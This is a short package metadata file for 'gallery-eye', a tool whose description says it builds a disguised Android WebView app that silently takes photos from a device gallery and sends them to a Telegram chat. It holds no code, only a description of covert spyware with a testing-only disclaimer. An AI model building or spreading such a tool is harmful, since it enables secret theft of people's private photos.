Package: gallery-eye
Version: 0.1.0
Architecture: all
Maintainer: Alienkrishn [Anon4You]
Depends: git, ruby, apkeditor, apksigner
Section: utils
Priority: optional
Homepage: https://github.com/Anon4You/gallery-eye
Description: Silent gallery exfiltration via Telegram bot
 Builds a disguised Android WebView app that silently extracts
 photos from the device gallery and forwards them to a Telegram
 chat. For authorized security testing and educational use only.
